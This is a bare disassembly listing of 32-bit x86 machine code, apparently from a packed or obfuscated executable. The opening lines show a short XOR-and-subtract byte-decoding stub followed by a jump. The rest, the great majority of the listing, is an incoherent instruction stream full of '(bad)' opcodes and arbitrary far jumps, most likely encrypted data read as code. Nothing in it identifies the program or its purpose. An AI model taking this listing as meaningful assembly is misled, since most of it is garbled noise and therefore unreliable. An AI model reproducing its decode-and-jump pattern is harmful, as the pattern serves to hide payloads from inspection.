  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fadd   QWORD PTR fs:[edi]
  40389a:	jbe    0x403901
  40389c:	lock fstp QWORD PTR [edi+0x62]
  4038a0:	(bad)  
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	bound  edx,QWORD PTR [esi]
  4038a6:	fsub   st(2),st
  4038a8:	lea    edx,[edi+0x5b058496]
  4038ae:	sub    al,dl
  4038b0:	lock pop ecx
  4038b2:	es fadd st(1),st
  4038b5:	fst    DWORD PTR [eax+0x39d1312c]
  4038bb:	sub    esp,DWORD PTR [edi]
  4038bd:	xchg   esp,eax
  4038be:	imul   ecx,DWORD PTR ds:0x308f61bb,0xbb27cb40
  4038c8:	stos   DWORD PTR es:[edi],eax
  4038c9:	sub    al,BYTE PTR [eax+0x304c2c61]
  4038cf:	scas   al,BYTE PTR es:[edi]
  4038d0:	and    DWORD PTR [esi],ebx
  4038d2:	in     eax,0x2
  4038d4:	pop    es
  4038d5:	aas    
  4038d6:	xchg   ebp,eax
  4038d7:	(bad)  
  4038d9:	push   0xd6eac86
  4038de:	jmp    0x40388b
  4038e0:	fsubr  QWORD PTR [eax+eiz*1+0x7c70c8bb]
  4038e7:	jmp    0x222d:0x982a412c
  4038ee:	es xchg ebx,eax
  4038f0:	and    eax,0x17936959
  4038f5:	into   
  4038f6:	pop    edi
  4038f7:	test   eax,0x383193b9
  4038fc:	ins    BYTE PTR es:[edi],dx
  4038fd:	jns    0x4038c6
  4038ff:	in     eax,dx
  403900:	cmp    al,0x93
  403902:	outs   dx,DWORD PTR ds:[esi]
  403903:	sub    BYTE PTR ds:0xf28c6d9,cl
  403909:	xor    eax,0xfdace465
  40390e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40390f:	aaa    
  403910:	outs   dx,DWORD PTR ds:[esi]
  403911:	xchg   edx,eax
  403912:	inc    edx
  403913:	and    ch,BYTE PTR [ebx]
  403915:	mov    eax,ds:0x226a344f
  40391a:	sbb    edx,DWORD PTR [edx-0x7c]
  40391d:	sbb    BYTE PTR [edx],dl
  40391f:	inc    edx
  403920:	and    eax,0x8b815700
  403925:	mov    BYTE PTR [ecx+edx*4-0x74],dh
  403929:	adc    DWORD PTR [ecx+0x5b],eax
  40392c:	fdivr  QWORD PTR [eax]
  40392e:	and    BYTE PTR [edi+ebp*1],0x19
  403932:	je     0x40392c
  403934:	ror    DWORD PTR [edx+0x78cc4a90],1
  40393a:	ins    BYTE PTR es:[edi],dx
  40393b:	pop    eax
  40393c:	add    eax,0xbac0f51c
  403941:	popf   
  403942:	push   esp
  403943:	repnz clc 
  403945:	pop    ds
  403946:	or     DWORD PTR [ebp-0x5ffc304],ecx
  40394c:	push   ss
  40394d:	inc    esi
  40394e:	adc    al,BYTE PTR [esi]
  403950:	enter  0x6c40,0xbf
  403954:	in     eax,0x3a
  403956:	xor    DWORD PTR [esi],eax
  403958:	ret    
  403959:	mov    bl,0xc9
  40395b:	push   eax
  40395c:	sub    eax,0xd128371
  403961:	or     al,0x6e
  403963:	inc    BYTE PTR [ebx]
  403965:	jmp    0xf11c:0x5ec87aac
  40396c:	mov    bh,0xd5
  40396e:	push   0xffffff93
  403970:	fnstenv [esi]
  403972:	aad    0x5f
  403974:	cwde   
  403975:	inc    esp
  403976:	xchg   esp,eax
  403977:	mov    bh,0x3
  403979:	rcl    BYTE PTR [edi+0x64],0xe3
  40397d:	js     0x4039ef
  40397f:	imul   edx,DWORD PTR [esi-0x4c],0xbc47f396
  403986:	sbb    BYTE PTR [esi+0x51fcf4af],cl
  40398c:	in     eax,dx
  40398d:	mov    ds:0xf9a9ae7c,eax
  403992:	add    DWORD PTR [esi-0x5624dafa],edi
  403998:	dec    esi
  403999:	ja     0x4039ed
  40399b:	ins    BYTE PTR es:[edi],dx
  40399c:	leave  
  40399d:	test   eax,0xb317258b
  4039a2:	stc    
  4039a3:	jl     0x40394c
  4039a5:	inc    edi
  4039a6:	fidiv  DWORD PTR [ebp-0x4424f719]
  4039ac:	mov    ds:0x3f2bd70,eax
  4039b1:	fcom   QWORD PTR [eax+0x7f]
  4039b4:	inc    edi
  4039b5:	mov    bl,0x9e
  4039b7:	jecxz  0x403975
  4039b9:	pop    esi
  4039ba:	js     0x403a26
  4039bc:	outs   dx,DWORD PTR ds:[esi]
  4039bd:	sbb    eax,0x6466bf70
  4039c2:	aas    
  4039c3:	sub    cl,BYTE PTR [ebx-0x72]
  4039c6:	add    DWORD PTR [ecx+0x64],0xd
  4039ca:	cld    
  4039cb:	clc    
  4039cc:	test   BYTE PTR [ebx+eax*8-0x6d00291b],dl
  4039d3:	mov    edi,0x555db287
  4039d8:	jne    0x403992
  4039da:	inc    edx
  4039db:	imul   esi,DWORD PTR [esi+0x1b20f15d],0xffffffdf
  4039e2:	adc    DWORD PTR [eax+0x52bdeac9],0x4b
  4039e9:	fidiv  WORD PTR [ebx]
  4039eb:	xchg   esi,eax
  4039ec:	pop    esp
  4039ed:	jno    0x40397b
  4039ef:	shl    BYTE PTR [ebx],cl
  4039f1:	fs pop eax
  4039f3:	xchg   ebx,eax
  4039f4:	ret    0x4110
  4039f7:	xlat   BYTE PTR ds:[ebx]
  4039f8:	jne    0x403995
  4039fa:	loopne 0x4039ed
  4039fc:	shl    ch,0xda
  4039ff:	imul   esp,DWORD PTR [ebp+0x7f273944],0xffffffc6
  403a06:	and    DWORD PTR [eax+0xce6646f],edx
  403a0c:	imul   ebp,esi,0xe186cddd
  403a12:	or     al,0x8b
  403a14:	pop    ds
  403a15:	xchg   ebp,eax
  403a16:	test   al,0x44
  403a18:	jg     0x40399d
  403a1a:	jns    0x403a48
  403a1c:	xchg   ebx,eax
  403a1d:	ins    BYTE PTR es:[edi],dx
  403a1e:	adc    eax,0xab43a053
  403a23:	cmp    BYTE PTR [esi],dl
  403a25:	sti    
  403a26:	int    0x1
  403a28:	cmp    bh,BYTE PTR [ebx+esi*2+0x30433b4c]
  403a2f:	popf   
  403a30:	ss xchg edx,eax
  403a32:	mov    ds:0xdeffa54b,al
  403a37:	sbb    DWORD PTR [edx],esi
  403a39:	daa    
  403a3a:	jmp    DWORD PTR [ebx]
  403a3c:	jmp    0x2b6e9a25
  403a41:	fisub  DWORD PTR [ebx+0x7e]
  403a44:	and    bl,BYTE PTR [ecx-0x740ebc96]
  403a4a:	pop    es
  403a4b:	xchg   esi,eax
  403a4c:	inc    edx
  403a4d:	cwde   
  403a4e:	push   0x7a699240
  403a53:	test   BYTE PTR [eax-0x1c],dl
  403a56:	add    DWORD PTR [ecx+0x76c471b5],ebp
  403a5c:	jnp    0x403ac4
  403a5e:	or     al,0x5e
  403a60:	inc    ecx
  403a61:	xlat   BYTE PTR ds:[ebx]
  403a62:	into   
  403a63:	jp     0x403ac4
  403a65:	push   esp
  403a66:	dec    esp
  403a67:	(bad)  
  403a69:	ss iret 
  403a6b:	dec    ebx
  403a6c:	aam    0xf8
  403a6e:	mov    ah,0x28
  403a70:	pop    edx
  403a71:	jo     0x403a8a
  403a73:	out    0x75,eax
  403a75:	sar    BYTE PTR [esi+0x323662c3],0x57
  403a7c:	retf   
  403a7d:	dec    ebx
  403a7e:	mov    edx,esp
  403a80:	xchg   esi,eax
  403a81:	out    dx,eax
  403a82:	cli    
  403a83:	cmp    cl,bl
  403a85:	inc    eax
  403a86:	std    
  403a87:	adc    ebx,DWORD PTR [esi]
  403a89:	nop
  403a8a:	mov    cl,0xea
  403a8c:	call   DWORD PTR [ebx]
  403a8e:	add    dl,al
  403a90:	clc    
  403a91:	inc    eax
  403a92:	inc    eax
  403a93:	jnp    0x403aef
  403a95:	add    cl,BYTE PTR [esi-0x80]
  403a98:	fnstsw WORD PTR [ebp-0x5c]
  403a9b:	cmp    DWORD PTR es:[esi+ebp*4],edi
  403a9f:	enter  0x2034,0x59
  403aa3:	cmp    BYTE PTR [ebx+0x6b],ah
  403aa6:	xor    BYTE PTR [esi],0xbc
  403aa9:	push   eax
  403aaa:	lods   al,BYTE PTR ds:[esi]
  403aab:	pop    eax
  403aac:	shl    dh,cl
  403aae:	push   ds
  403aaf:	adc    BYTE PTR [ebx],0xf2
  403ab2:	scas   eax,DWORD PTR es:[edi]
  403ab3:	or     BYTE PTR [ecx+0x6c],cl
  403ab6:	imul   esp,esi,0xc480b4cc
  403abc:	jle    0x403afc
  403abe:	xchg   esi,eax
  403abf:	mov    eax,0x460fad8d
  403ac4:	adc    DWORD PTR [ebp+0x31],edi
  403ac7:	rcl    edx,0xd1
  403aca:	sbb    BYTE PTR [esi+0x6b],bh
  403acd:	in     eax,0xdd
  403acf:	pop    edx
  403ad0:	fdivr  st,st(4)
  403ad2:	outs   dx,DWORD PTR ds:[esi]
  403ad3:	pop    es
  403ad4:	(bad)  
  403ad6:	mov    ch,0x37
  403ad8:	mov    edx,0x7018bbd5
  403add:	in     al,0x51
  403adf:	mov    cl,0x3
  403ae1:	dec    esp
  403ae2:	js     0x403a79
  403ae4:	jl     0x403a74
  403ae6:	inc    esi
  403ae7:	imul   esp
  403ae9:	or     al,0xf0
  403aeb:	sbb    eax,0x7a6e6ed3
  403af0:	sub    dl,dh
  403af2:	lods   eax,DWORD PTR ds:[esi]
  403af3:	out    dx,al
  403af4:	adc    DWORD PTR [esp+eax*4],edi
  403af7:	test   BYTE PTR [ebx],ch
  403af9:	jl     0x403b2d
  403afb:	mov    edx,0xc20308ab
  403b00:	jl     0x403b70
  403b02:	div    DWORD PTR [edi-0x69]
  403b05:	pmuludq mm2,mm3
  403b08:	(bad)  
  403b09:	mov    eax,ds:0xe00bded7
  403b0e:	test   al,0xde
  403b10:	xchg   ecx,eax
  403b11:	pop    eax
  403b12:	add    al,0xee
  403b14:	in     al,dx
  403b15:	nop
  403b16:	push   edi
  403b17:	addr16 xchg cl,bh
  403b1a:	dec    edi
  403b1b:	(bad)  
  403b1d:	push   ebp
  403b1e:	pop    ecx
  403b1f:	and    al,BYTE PTR [edx]
  403b21:	mov    ds:0xb553bf8,eax
  403b26:	scas   eax,DWORD PTR es:[edi]
  403b27:	inc    ecx
  403b28:	dec    ebx
  403b29:	(bad)  
  403b2a:	jns    0x403b14
  403b2c:	mov    eax,ds:0x5a857d0d
  403b31:	int    0xb3
  403b33:	sub    DWORD PTR [eax-0x70],0xffffff9a
  403b37:	pop    ecx
  403b38:	mov    bl,0x7e
  403b3a:	push   esp
  403b3b:	jge    0x403b65
  403b3d:	loope  0x403b00
  403b3f:	stc    
  403b40:	fisttp WORD PTR [esi+0x1e]
  403b43:	nop
  403b44:	enter  0x8e72,0x51
  403b48:	fmul   DWORD PTR [ebp+eax*2+0x6b]
  403b4c:	sub    ch,BYTE PTR [edi-0x536a300e]
  403b52:	inc    edi
  403b53:	call   0x6f7c:0xbc02e9ff
  403b5a:	or     BYTE PTR [esi-0x24],cl
  403b5d:	jmp    0xc564594d
  403b62:	loopne 0x403bc8
  403b64:	nop
  403b65:	in     eax,0x15
  403b67:	push   ecx
  403b68:	lea    ebp,[edi+0x1cd99289]
  403b6e:	inc    edi
  403b6f:	mov    ebx,0x1bce2a85
  403b74:	jg     0x403baa
  403b76:	js     0x403b2d
  403b78:	scas   al,BYTE PTR es:[edi]
  403b79:	(bad)  
  403b7a:	xchg   ecx,eax
  403b7b:	out    dx,eax
  403b7c:	jbe    0x403b40
  403b7e:	stos   DWORD PTR es:[edi],eax
  403b7f:	shl    DWORD PTR [esi],1
  403b81:	push   ebx
  403b82:	es and cl,ah
  403b85:	sub    BYTE PTR [edi+0x1454907a],cl
  403b8b:	mov    ecx,0xa4436f5b
  403b90:	ins    DWORD PTR es:[edi],dx
  403b91:	mov    edx,DWORD PTR [esi-0x65]
  403b94:	pop    edi
  403b95:	and    edx,DWORD PTR [edi]
  403b97:	fcomp  DWORD PTR [edx-0x7e]
  403b9a:	int3   
  403b9b:	sbb    esi,ecx
  403b9d:	jmp    0x5c517742
  403ba2:	xchg   esp,eax
  403ba3:	ss xor bl,dl
  403ba6:	jecxz  0x403ba9
  403ba8:	mov    esp,0xc671e99b
  403bad:	inc    ecx
  403bae:	push   0x1e
  403bb0:	test   BYTE PTR [esi-0xef7d5f2],bl
  403bb6:	sbb    esp,edi
  403bb8:	cdq    
  403bb9:	ret    0xcb57
  403bbc:	in     eax,0x38
  403bbe:	(bad)  
  403bbf:	xchg   esi,eax
  403bc0:	es sub al,0x12
  403bc3:	pop    edi
  403bc4:	sbb    al,0x78
  403bc6:	paddq  mm6,QWORD PTR [edx-0x21]
  403bca:	mov    ebx,ecx
  403bcc:	fdivr  DWORD PTR [esi]
  403bce:	jmp    0x403c4b
  403bd0:	out    0x3,eax
  403bd2:	daa    
  403bd3:	and    ebp,DWORD PTR [ebp-0x78fef2d1]
  403bd9:	in     eax,0x68
  403bdb:	pop    esp
  403bdc:	mov    fs,WORD PTR [ebx]
  403bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bdf:	jno    0x403c3e
  403be1:	mov    edx,0x3f14923d
  403be6:	pop    esi
  403be7:	cmp    eax,0x3dacb3b5
  403bec:	and    eax,ecx
  403bee:	arpl   si,si
  403bf0:	hlt    
  403bf1:	jae    0x403c30
  403bf3:	lods   al,BYTE PTR ds:[esi]
  403bf4:	or     dl,BYTE PTR [ecx]
  403bf6:	es icebp 
  403bf8:	jmp    0x163c6504
  403bfd:	popa   
  403bfe:	adc    ebx,DWORD PTR [ebp-0x4fc9bbd2]
  403c04:	lahf   
  403c05:	mov    dh,0x91
  403c07:	dec    esi
  403c08:	xchg   edi,eax
  403c09:	dec    eax
  403c0a:	ins    BYTE PTR es:[edi],dx
  403c0b:	jnp    0x403c56
  403c0d:	loop   0x403beb
  403c0f:	inc    esp
  403c10:	pop    ebx
  403c11:	sub    eax,DWORD PTR [edi-0x75]
  403c14:	mov    dl,BYTE PTR [ebx+0x61]
  403c17:	mov    eax,0x4e2db7c9
  403c1c:	xor    al,0xa6
  403c1e:	cmp    al,BYTE PTR [edx+0x73]
  403c21:	jno    0x403c1d
  403c23:	cwde   
  403c24:	lods   al,BYTE PTR ds:[esi]
  403c25:	mov    bh,0x95
  403c27:	sub    edx,DWORD PTR [ebx+edx*8]
  403c2a:	ds dec esp
  403c2c:	cmp    al,ch
  403c2e:	xchg   esp,eax
  403c2f:	fisttp WORD PTR [edx-0x75f88bc]
  403c35:	jecxz  0x403c7e
  403c37:	push   esi
  403c38:	fcomp  DWORD PTR [edi+0x7e5f7506]
  403c3e:	dec    ebp
  403c3f:	in     al,0x78
  403c41:	jl     0x403c84
  403c43:	in     al,0x79
  403c45:	jge    0x403cc3
  403c47:	imul   edx,DWORD PTR [eax+0x714820df],0xa
  403c4e:	inc    esi
  403c4f:	in     al,0xd9
  403c51:	fnstsw WORD PTR [edx-0x66b09813]
  403c57:	push   cs
  403c58:	outs   dx,BYTE PTR ds:[esi]
  403c59:	mov    ds:0xbec87c9,al
  403c5e:	pop    esi
  403c5f:	fbld   TBYTE PTR [eax]
  403c61:	out    dx,eax
  403c62:	jp     0x403c34
  403c64:	fadd   QWORD PTR [ebx-0x7967bbe2]
  403c6a:	call   0x380c:0xcc717554
  403c71:	fidivr WORD PTR [ebx]
  403c73:	push   ebp
  403c74:	cmp    BYTE PTR [esi],ah
  403c76:	push   cs
  403c77:	fisttp DWORD PTR [edi-0x5e917245]
  403c7d:	jecxz  0x403cea
  403c7f:	lahf   
  403c80:	test   al,0xe4
  403c82:	gs je  0x403c57
  403c85:	and    eax,0x891c7d17
  403c8a:	call   0x3d60:0x34273298
  403c91:	inc    edi
  403c92:	mov    dh,0x13
  403c94:	in     al,0x67
  403c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c97:	mov    ch,0x1d
  403c99:	retf   0xb567
  403c9c:	jle    0x403cea
  403c9e:	pushf  
  403c9f:	inc    edi
  403ca0:	imul   esp,DWORD PTR ds:0xcfafbd70,0x47c30ecb
  403caa:	mov    ch,0xd9
  403cac:	mov    dh,0xa8
  403cae:	lods   eax,DWORD PTR ds:[esi]
  403caf:	jg     0x403ce6
  403cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb2:	jne    0x403d31
  403cb4:	jmp    0x403c81
  403cb6:	dec    ecx
  403cb7:	loopne 0x403d2c
  403cb9:	mov    DWORD PTR [eax-0x22e20219],ebp
  403cbf:	add    cl,BYTE PTR [ebx+0x3b]
  403cc2:	imul   BYTE PTR [eax+0xad17d4d]
  403cc8:	cmp    eax,0xa6b64806
  403ccd:	push   es
  403cce:	xchg   ebx,eax
  403ccf:	jne    0x403c5e
  403cd1:	fwait
  403cd2:	adc    al,0x98
  403cd4:	fistp  WORD PTR [eax]
  403cd6:	adc    al,0xfd
  403cd8:	sbb    BYTE PTR [edi-0x790f7ee8],ch
  403cde:	pop    edx
  403cdf:	inc    ecx
  403ce0:	mov    cl,0xe
  403ce2:	pop    ecx
  403ce3:	xchg   BYTE PTR [edx+0x12e92cd5],ch
  403ce9:	fmulp  st(3),st
  403ceb:	pop    edi
  403cec:	pop    esp
  403ced:	mov    eax,0xdbe137b1
  403cf2:	inc    edi
  403cf3:	dec    esp
  403cf4:	cmp    eax,0x1201de8
  403cf9:	mov    ds:0x2e3c6816,eax
  403cfe:	jnp    0x403cd5
  403d00:	cs mov eax,0x907d3fa0
  403d06:	ja     0x403d09
  403d08:	fist   DWORD PTR [ecx+edi*2]
  403d0b:	fst    QWORD PTR [edx-0x1c]
  403d0e:	mov    edx,DWORD PTR [ecx]
  403d10:	add    al,0x40
  403d12:	mov    ch,0xb3
  403d14:	into   
  403d15:	and    DWORD PTR [edx],0x56
  403d18:	xor    al,0x1d
  403d1a:	es hlt 
  403d1c:	or     al,0x2c
  403d1e:	sbb    eax,0x4815f9fe
  403d23:	mov    eax,0xc4c029db
  403d28:	lods   eax,DWORD PTR ds:[esi]
  403d29:	pop    ebp
  403d2a:	out    dx,al
  403d2b:	adc    al,0xcb
  403d2d:	stc    
  403d2e:	loope  0x403d20
  403d30:	cmp    al,0x38
  403d32:	test   al,0x13
  403d34:	ficom  DWORD PTR [ecx+0x7ea5c634]
  403d3a:	or     al,BYTE PTR [ebx]
  403d3c:	cmp    eax,0xf0ede74e
  403d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d42:	adc    DWORD PTR [edx+0x1f],0x68384664
  403d49:	mov    eax,0x1d8466f
  403d4e:	sbb    BYTE PTR [ecx-0x6c],dh
  403d51:	(bad)  
  403d52:	fisubr WORD PTR [esi+edi*4-0x41]
  403d56:	pusha  
  403d57:	aam    0xe2
  403d59:	sub    BYTE PTR [eax-0x11297905],ch
  403d5f:	jb     0x403da4
  403d61:	lea    edi,[esi+ebx*8]
  403d64:	mov    edx,0xb453fef4
  403d6a:	mov    ds:0xcb7d3f71,eax
  403d6f:	sbb    al,0x5
  403d71:	and    bl,BYTE PTR [edi+ebx*8-0x1ffae07d]
  403d78:	ja     0x403dc0
  403d7a:	imul   ebx,esi,0x876b1f39
  403d80:	add    BYTE PTR [edx-0x6c],0xbd
  403d84:	stos   DWORD PTR es:[edi],eax
  403d85:	push   edi
  403d86:	or     DWORD PTR [edx],esi
  403d88:	xor    dl,BYTE PTR [eax-0x2c]
  403d8b:	push   0x33
  403d8d:	maxps  xmm4,XMMWORD PTR [ebp+0x12a7ea98]
  403d94:	inc    esp
  403d95:	and    al,BYTE PTR [ecx]
  403d97:	bound  ecx,QWORD PTR [edx+0x6e8873ed]
  403d9d:	adc    eax,0xefc72be0
  403da2:	jmp    0x403dfa
  403da4:	pop    ebx
  403da5:	jmp    0x5056:0x4312ed4d
  403dac:	addr16 std 
  403dae:	adc    eax,0xfb0b22f1
  403db3:	and    eax,0xfbb9d3f1
  403db8:	aad    0x85
  403dba:	mov    bh,BYTE PTR [eax+0x21]
  403dbd:	sub    ch,cl
  403dbf:	stc    
  403dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc1:	popf   
  403dc2:	mov    eax,0x25080946
  403dc7:	mov    dl,BYTE PTR [ecx+0x34]
  403dca:	or     esp,DWORD PTR [edx+0x7811d8ba]
  403dd0:	sahf   
  403dd1:	das    
  403dd2:	out    0xc4,al
  403dd4:	adc    eax,0xd67fb8c0
  403dd9:	sbb    al,0x96
  403ddb:	cmp    eax,0x465333c2
  403de0:	cmc    
  403de1:	mov    ebp,0xa73436f9
  403de6:	push   ebx
  403de7:	test   DWORD PTR ds:0x352603f9,edi
  403ded:	mov    ecx,0xab0c9d4
  403df2:	push   edx
  403df3:	ffreep st(5)
  403df5:	mov    BYTE PTR [esi-0x5892640b],ch
  403dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dfc:	fisttp WORD PTR ds:0x8d686d89
  403e02:	call   0x8ef10d30
  403e07:	xchg   esi,eax
  403e08:	xchg   edx,eax
  403e09:	cmp    dl,bl
  403e0b:	sbb    al,0x9c
  403e0d:	js     0x403e4f
  403e0f:	out    dx,al
  403e10:	daa    
  403e11:	dec    esp
  403e12:	xchg   esp,edi
  403e14:	loopne 0x403e46
  403e16:	adc    al,0x3c
  403e18:	pop    ebx
  403e19:	ja     0x403e4d
  403e1b:	aam    0x9e
  403e1d:	adc    eax,esp
  403e1f:	popf   
  403e20:	test   BYTE PTR [esi+0x653c514a],dl
  403e26:	mov    WORD PTR [eax],?
  403e28:	je     0x403de7
  403e2a:	dec    eax
  403e2b:	stos   BYTE PTR es:[edi],al
  403e2c:	loop   0x403e26
  403e2e:	jb     0x403e57
  403e30:	xor    ebp,DWORD PTR [ebp+0x4223eaa6]
  403e36:	(bad)  
  403e37:	in     al,0x1d
  403e39:	imul   ecx,DWORD PTR [eax+0x3e],0x41
  403e3d:	sub    al,0x16
  403e3f:	add    al,0x13
  403e41:	arpl   WORD PTR [esp+esi*4-0x36],bx
  403e45:	test   DWORD PTR [edx],ebx
  403e47:	(bad)  
  403e48:	arpl   ax,di
  403e4a:	jle    0x403ecb
  403e4c:	adc    BYTE PTR [eiz*4+0x1b127b4f],al
  403e53:	shr    ebp,0xf3
  403e56:	outs   dx,BYTE PTR ss:[esi]
  403e58:	fmul   DWORD PTR [edx+0x71d48823]
  403e5e:	sbb    DWORD PTR [esp+edi*8],ecx
  403e61:	or     cl,BYTE PTR [edi-0x4a9b11ca]
  403e67:	push   ds
  403e68:	scas   al,BYTE PTR es:[edi]
  403e69:	xchg   edx,eax
  403e6a:	and    dl,BYTE PTR [ecx]
  403e6c:	out    dx,al
  403e6d:	xchg   esp,eax
  403e6e:	dec    esi
  403e6f:	push   es
  403e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e71:	iret   
  403e72:	mov    ebx,0xb912f8ba
  403e77:	pushf  
  403e78:	dec    eax
  403e79:	pusha  
  403e7a:	aad    0x9f
  403e7c:	shr    ecx,1
  403e7e:	push   eax
  403e7f:	loope  0x403e42
  403e81:	std    
  403e82:	adc    edx,DWORD PTR [edi]
  403e84:	stos   DWORD PTR es:[edi],eax
  403e85:	fidiv  DWORD PTR [ecx]
  403e87:	(bad)  
  403e88:	mov    ebx,0x54ab76a
  403e8d:	xchg   edx,eax
  403e8e:	ins    BYTE PTR es:[edi],dx
  403e8f:	loope  0x403e7e
  403e91:	test   ecx,0xd25fdeb7
  403e97:	aaa    
  403e98:	sub    bl,BYTE PTR [esi+0x16]
  403e9b:	mov    dl,0xa6
  403e9d:	(bad)  
  403e9e:	sbb    esi,DWORD PTR [edx]
  403ea0:	js     0x403efa
  403ea2:	cmp    DWORD PTR [ebx+0x2f],edi
  403ea5:	shl    DWORD PTR [eax+0xedafa1],0x88
  403eac:	add    esi,ebx
  403eae:	repz jp 0x403f24
  403eb1:	lods   al,BYTE PTR ds:[esi]
  403eb2:	fnstenv [ebp+esi*1-0x7f6d293d]
  403eb9:	jae    0x403f03
  403ebb:	mov    ch,0x8
  403ebd:	imul   bl
  403ebf:	xor    DWORD PTR [edi+esi*1],ecx
  403ec2:	adc    DWORD PTR [eax],edi
  403ec4:	jmp    0x9afe:0x1faa6850
  403ecb:	jg     0x403e53
  403ecd:	add    DWORD PTR [edx+0x15e1fdd1],edi
  403ed3:	pusha  
  403ed4:	fmulp  st(6),st
  403ed6:	add    eax,0x926f6450
  403edb:	(bad)  
  403edc:	push   DWORD PTR [ecx]
  403ede:	jp     0x403ede
  403ee0:	jl     0x403f34
  403ee2:	ds cdq 
  403ee4:	jo     0x403ee8
  403ee6:	test   DWORD PTR [ebp+0x356cbbf2],edi
  403eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eed:	cli    
  403eee:	leave  
  403eef:	inc    ebx
  403ef0:	inc    esi
  403ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ef2:	mov    ds:0x837594b4,al
  403ef7:	cmp    eax,0xa2e5e3d3
  403efc:	sub    eax,0xbebad962
  403f01:	cli    
  403f02:	xchg   edi,eax
  403f03:	and    ch,BYTE PTR [ecx+0x34f25e64]
  403f09:	cmp    BYTE PTR [ecx+eiz*2-0x69],cl
  403f0d:	pop    ds
  403f0e:	in     al,dx
  403f0f:	ins    DWORD PTR es:[edi],dx
  403f10:	lahf   
  403f11:	repnz and al,bl
  403f14:	js     0x403ea2
  403f16:	mov    esp,0x3ca1d79b
  403f1b:	in     eax,dx
  403f1c:	mov    ecx,0x9510d328
  403f21:	push   0xffffffaf
  403f23:	ins    DWORD PTR es:[edi],dx
  403f24:	aam    0x61
  403f26:	outs   dx,BYTE PTR ds:[esi]
  403f27:	cmc    
  403f28:	mov    bl,0x4
  403f2a:	shr    DWORD PTR [esi-0x2b04d9f5],0xa
  403f31:	scas   al,BYTE PTR es:[edi]
  403f32:	test   DWORD PTR [esi+ecx*1-0xb177647],edi
  403f39:	mov    ebx,0x35b4ec6e
  403f3e:	data16 in al,dx
  403f40:	retf   
  403f41:	outs   dx,DWORD PTR ds:[esi]
  403f42:	pop    ebp
  403f43:	out    0xf1,al
  403f45:	jg     0x403f52
  403f47:	sahf   
  403f48:	dec    ah
  403f4a:	mov    bh,al
  403f4c:	std    
  403f4d:	fwait
  403f4e:	cmc    
  403f4f:	cli    
  403f50:	mov    al,BYTE PTR [ebx]
  403f52:	bound  eax,QWORD PTR [ebp-0x1f01a6d4]
  403f58:	fld    st(5)
  403f5a:	int    0x3b
  403f5c:	jge    0x403ee8
  403f5e:	cs jp  0x403fa0
  403f61:	sti    
  403f62:	icebp  
  403f63:	out    dx,eax
  403f64:	sbb    BYTE PTR [ebx+0x52],ch
  403f67:	mov    ds,ecx
  403f69:	cmp    ah,BYTE PTR [edi+0x4647f0db]
  403f6f:	and    ch,bh
  403f71:	popa   
  403f72:	inc    ebx
  403f73:	fild   QWORD PTR [edi+0x48256c50]
  403f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7a:	xor    ecx,esi
  403f7c:	fwait
  403f7d:	cld    
  403f7e:	jnp    0x403f72
  403f80:	icebp  
  403f81:	outs   dx,DWORD PTR cs:[esi]
  403f83:	js     0x403f2a
  403f85:	mov    DWORD PTR [edx],0x999c6747
  403f8b:	fisttp QWORD PTR ds:0xf3fdea59
  403f91:	xchg   ecx,eax
  403f92:	inc    eax
  403f93:	loopne 0x404007
  403f95:	mov    bh,0xa4
  403f97:	ja     0x403f74
  403f99:	ret    
  403f9a:	leave  
  403f9b:	test   eax,0xd4f61353
  403fa0:	out    dx,eax
  403fa1:	inc    esi
  403fa2:	(bad)  
  403fa3:	mov    WORD PTR [ebp+0x2d6d90cb],es
  403fa9:	std    
  403faa:	sub    al,0x74
  403fac:	add    eax,0x3ab77575
  403fb1:	mul    BYTE PTR [eax]
  403fb3:	adc    edx,DWORD PTR [esp+eiz*2+0x4aeeef63]
  403fba:	inc    eax
  403fbb:	add    BYTE PTR [ebp+0x4e],dl
  403fbe:	rol    BYTE PTR [ebx+ebx*2],0x1e
  403fc2:	rcr    DWORD PTR [eax+0x60],0xd6
  403fc6:	push   esi
  403fc7:	sbb    eax,0xa7af4c58
  403fcc:	out    dx,eax
  403fcd:	sub    DWORD PTR [ebx+0x3d09c9e0],ecx
  403fd3:	gs int3 
  403fd5:	cmp    al,0xcf
  403fd7:	push   ecx
  403fd8:	dec    esp
  403fd9:	scas   al,BYTE PTR es:[edi]
  403fda:	push   cs
  403fdb:	push   esp
  403fdc:	push   esi
  403fdd:	mov    ah,0x65
  403fdf:	and    eax,0x88ad3cfe
  403fe4:	fadd   DWORD PTR [edx]
  403fe6:	inc    eax
  403fe7:	cmp    al,0x47
  403fe9:	(bad)  
  403fea:	push   ebx
  403feb:	int3   
  403fec:	sbb    DWORD PTR [eax],ecx
  403fee:	push   0x366b4552
  403ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ff4:	push   cs
  403ff5:	xchg   esi,eax
  403ff6:	adc    eax,0x8481ed9c
  403ffb:	call   0xd40d:0x4fcaf5f8
  404002:	xor    cl,BYTE PTR [ecx+0x56dc14c5]
